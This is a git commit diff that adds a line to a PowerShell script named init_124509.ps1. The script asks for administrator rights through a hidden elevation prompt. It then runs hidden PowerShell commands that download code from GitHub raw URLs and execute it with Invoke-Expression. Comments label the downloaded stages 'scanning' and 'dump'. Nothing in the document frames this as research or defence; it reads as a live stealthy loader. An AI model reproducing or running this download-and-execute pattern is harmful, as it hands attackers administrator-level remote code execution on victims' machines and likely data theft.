9f4ea58a94adcf6d1fb3ec5214fda2db79082e0f
tameval <114147355+tameval@users.noreply.github.com>
2022-10-20 18:47:10 +0900

    Update init_124509.ps1

--- init_124509.ps1
+++ init_124509.ps1
@@ -1,2 +1,6 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
+
+#scanning
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509')"
+#dump
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/body_124509')"
